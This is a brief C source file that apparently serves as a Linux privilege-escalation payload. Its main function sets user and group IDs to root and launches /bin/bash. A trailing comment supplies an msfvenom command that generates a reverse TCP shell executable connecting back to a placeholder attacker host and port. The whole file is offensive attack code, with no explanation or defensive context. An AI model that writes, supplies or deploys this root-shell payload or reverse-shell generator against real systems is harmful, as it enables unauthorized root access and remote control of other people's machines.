int main(void)
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}

/* Alternatively a reverse can be made using msfvenom,
>>  msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf >
shell.elf (it will create a .elf executable file) */
